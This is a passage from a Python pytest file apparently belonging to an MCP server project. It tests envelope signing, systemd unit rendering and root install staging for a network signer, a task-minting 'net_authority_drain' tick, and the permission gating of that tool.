        ea.sign_envelope(private_key_path=key, submitted_by="w", task_id="ABCD2345", agent="kart",
                         ttl_seconds=60, nonce="n" * 32)
    with pytest.raises(ValueError):
        ea.sign_envelope(private_key_path=key, submitted_by="w", task_id="ABCD2345", agent="kart",
                         task="x", task_hash="a" * 64, ttl_seconds=60, nonce="n" * 32)


# ── the unit ──────────────────────────────────────────────────────────────────

def test_unit_renders_as_the_key_owner_and_install_is_one_root_line(tmp_path):
    text = ns.render_unit(python=Path("/v/bin/python"), key=Path("/k/private.pem"),
                          ring=Path("/k/verifiers.public.json"), user="willow-operator",
                          group="sean-campbell", willow_home=Path("/h"), apps_root=Path("/h/mcp_apps"))
    assert "@" not in text
    assert "User=willow-operator" in text and "Group=sean-campbell" in text
    assert "-m willow_mcp.net_signer serve" in text and "RuntimeDirectory=willow-net-signer" in text
    unit, ring = tmp_path / ns.UNIT, tmp_path / "r.json"
    unit.write_text(text)
    ring.write_text("{}")
    line = ns.install_lines(rendered_path=unit, ring_source=ring,
                            ring_dest=Path("/k/verifiers.public.json"))
    assert line.count("sudo") == 4 and "systemctl enable --now" in line
    # the line may never name a file that is not there (gap 6031199ac4e1)
    with pytest.raises(FileNotFoundError):
        ns.install_lines(rendered_path=unit, ring_source=tmp_path / "absent.json",
                         ring_dest=Path("/k/verifiers.public.json"))


def test_install_stages_under_willow_home_and_refuses_the_root_line_without_a_ring(
        tmp_path, verifier, monkeypatch):
    """The first live install (2026-09-20) ran in a shell with no
    WILLOW_KEYRING, staged no ring, printed a sudo line naming the ring
    anyway, and left the unit beside the operator's cwd — the active tree.
    Three states now: ready / ring_missing / error; a root line only in the
    first; nothing ever written to cwd."""
    home = tmp_path / "home"
    monkeypatch.setenv("WILLOW_HOME", str(home))
    monkeypatch.setenv("WILLOW_MCP_EGRESS_CONFIG_DIR", str(tmp_path / "egress"))
    monkeypatch.setenv(ns.KEY_ENV, str(tmp_path / "egress" / "private.pem"))
    monkeypatch.delenv("WILLOW_KEYRING", raising=False)
    (tmp_path / "cwd").mkdir()
    monkeypatch.chdir(tmp_path / "cwd")

    out = ns.stage_install(group="sean-campbell", python=Path("/v/bin/python"))
    assert out["state"] == "ring_missing" and out["run_this_once_as_root"] is None
    assert out["missing"]["env"] == "WILLOW_KEYRING" and "WILLOW_KEYRING=" in out["missing"]["run_instead"]
    assert out["ring_staged"] is None
    assert Path(out["unit"]).is_file() and Path(out["unit"]).parent == home / "deploy" / "net-signer"
    assert list((tmp_path / "cwd").iterdir()) == []   # nothing in the caller's cwd

    # a keyring that is not one: error, still no root line
    bad = tmp_path / "bad.json"
    bad.write_text(json.dumps({"verifiers": [{"name": "s", "key": "ab" * 32, "kind": "hmac"}]}))
    out = ns.stage_install(group="sean-campbell", keyring=bad, python=Path("/v/bin/python"))
    assert out["state"] == "error" and out["run_this_once_as_root"] is None
    assert "no ed25519 verifier" in out["error"]

    # the real ring: ready, and every path the line names exists
    out = ns.stage_install(group="sean-campbell", keyring=verifier["full_ring"],
                           python=Path("/v/bin/python"))
    assert out["state"] == "ready"
    line = out["run_this_once_as_root"]
    assert out["unit"] in line and out["ring_staged"] in line
    assert Path(out["ring_staged"]).is_file()
    assert json.loads(Path(out["ring_staged"]).read_text())["public_only"] is True
    # the CLI exit code says whether a root line was printed
    monkeypatch.setenv("WILLOW_KEYRING", str(verifier["full_ring"]))
    # Verb 17 (unit.install): the keyboard path is behind --keyboard; without
    # it the CLI refuses and points at unit_install_execute.
    assert ns.main(["install", "--group", "sean-campbell", "--stage-dir", str(tmp_path / "s")]) == 2
    assert ns.main(["install", "--keyboard", "--group", "sean-campbell",
                    "--stage-dir", str(tmp_path / "s")]) == 0
    monkeypatch.delenv("WILLOW_KEYRING")
    assert ns.main(["install", "--keyboard", "--group", "sean-campbell",
                    "--stage-dir", str(tmp_path / "s")]) == 2


def test_hold_ttl_is_inside_the_lease_ceiling():
    from willow_mcp import lease, server

    assert 0 < server._HELD_NET_TTL_SECONDS <= lease.MAX_TTL_SECONDS
    assert na.SEAL_MAX_AGE_S == na.HELD_MAX_AGE_S


# ── the verb: net_authority_drain / tick ──────────────────────────────────────

def _confirmed_mapping(pg, app_id, table, fields):
    return {"table": table, "confirmed": True, "fields": _FIELDS}


def test_tick_is_one_envelope_over_both_halves_and_mints_end_to_end(egress_keys, verifier, tmp_path,
                                                                    monkeypatch):
    """The verb's whole job: the held row from hold_and_propose, sealed by the
    operator, is minted and released by ONE tick — with the confirmed tasks
    mapping resolved the way task_submit resolves it, not a hand-built
    cols dict."""
    from willow_mcp import schema_profile as sp

    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    monkeypatch.setattr(sp, "resolve", _confirmed_mapping)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    ledger = _Ledger()
    signer = _signer(egress_keys, verifier, tmp_path)

    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db, ledger=ledger, call=signer.handle)
    assert r["state"] == "empty" and r["tasks"]["state"] == "empty" and r["leases"]["state"] == "empty"
    assert r["event"] == "net_authority_tick"

    out = _held(pg, store)
    tid, rid = out["task_id"], out["record_id"]
    _stamp(store, rid, "pair-1")
    _put_pair(db, "pair-1", "q", out["seal_this"])
    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db, ledger=ledger, call=signer.handle)
    assert r["state"] == "populated" and r["tasks"]["rows"][0]["state"] == "waiting"
    assert r["leases"]["state"] == "empty"

    _seal_in_db(db, "pair-1", verifier, _fresh(verifier, "q", out["seal_this"]))
    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db, ledger=ledger, call=signer.handle)
    assert r["state"] == "populated" and r["tasks"]["rows"][0]["state"] == "minted"
    assert pg.tasks[tid]["status"] == "pending"
    assert ledger.rows[-1][1] == na.EVENT_MINTED


def test_tick_three_state_on_queue_mapping_store_and_signer(egress_keys, verifier, tmp_path,
                                                            monkeypatch):
    from willow_mcp import schema_profile as sp

    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    # no queue: unreachable, nothing consumed, both halves None
    monkeypatch.setattr("willow_mcp.db.get_pg", lambda: None)
    r = na.tick(app_id="willow")
    assert r["state"] == "unreachable" and r["reason"] == "postgres_unavailable"
    assert r["tasks"] is None and r["leases"] is None

    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    # unconfirmed mapping: a write may not guess (§3.4)
    monkeypatch.setattr(sp, "resolve", lambda *a: {"table": "tasks", "confirmed": False, "fields": _FIELDS})
    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db)
    assert r["state"] == "unreachable" and r["reason"] == "tasks_mapping_unconfirmed"
    monkeypatch.setattr(sp, "resolve", lambda *a: {"error": "no such table"})
    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db)
    assert r["state"] == "unreachable" and r["reason"] == "tasks_mapping_unresolved"

    # a held row with the signer down: the tick is populated (it saw the
    # row) and the row itself is unreachable — never collapsed into empty
    monkeypatch.setattr(sp, "resolve", _confirmed_mapping)
    out = _held(pg, store)
    _stamp(store, out["record_id"], "pair-1")
    _put_pair(db, "pair-1", "q", out["seal_this"])
    _seal_in_db(db, "pair-1", verifier, _fresh(verifier, "q", out["seal_this"]))
    r = na.tick(app_id="willow", pg=pg, store=store, db_path=db,
                call=lambda req: {"state": "unreachable", "cause": "socket down"})
    assert r["state"] == "populated" and r["tasks"]["rows"][0]["state"] == "unreachable"
    assert pg.tasks[out["task_id"]]["status"] == na.HELD_STATUS

    # a blind half beside an empty half is a tick that could not tell
    assert na.combined_state({"state": "empty"}, {"state": "empty"}) == ("empty", None)
    assert na.combined_state({"state": "unreachable", "reason": "queue_unavailable"},
                             {"state": "empty"}) == ("unreachable", "queue_unavailable")
    assert na.combined_state({"state": "empty"}, {"state": "populated"}) == ("populated", None)


def test_net_authority_drain_is_gated_classed_hooked_and_delegates(monkeypatch):
    """seal_drain's sibling, registered the same five ways: the
    governance_sync and full_access groups, the WRITE tier, the seat hook's
    write-tool set (both copies), and NOT in DESK_CORE — seal_drain is not
    advertised there either; both are callable by name."""
    import importlib.util
    from pathlib import Path as _P

    from willow_mcp import advertise, gate, server, tier_policy

    assert "net_authority_drain" in gate.PERMISSION_GROUPS["governance_sync"]
    assert "net_authority_drain" in gate.PERMISSION_GROUPS["full_access"]
    assert "net_authority_drain" not in gate.PERMISSION_GROUPS["governance_propose"]
    assert tier_policy.TOOL_CLASS["net_authority_drain"] == tier_policy.WRITE
    assert "net_authority_drain" not in advertise.DESK_CORE and "seal_drain" not in advertise.DESK_CORE
    repo = _P(__file__).resolve().parent.parent
    for hook in ("hooks/pre_tool_use.py", "src/willow_mcp/bundle/hooks/pre_tool_use.py"):
        spec = importlib.util.spec_from_file_location("hook_mod", repo / hook)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        assert "net_authority_drain" in mod._SEAT_WRITE_TOOLS, hook

    seen = {}
    monkeypatch.setattr(na, "tick", lambda **kw: seen.update(kw) or {"state": "empty"})
    monkeypatch.setattr(server, "get_pg", lambda: "PG")
    fn = getattr(server.net_authority_drain, "__wrapped__", server.net_authority_drain)
    assert fn("willow", max_rows=7) == {"state": "empty"}
    assert seen == {"app_id": "willow", "pg": "PG", "max_rows": 7}
    seen.clear()
    assert fn("willow") == {"state": "empty"}
    assert seen == {"app_id": "willow", "pg": "PG"}
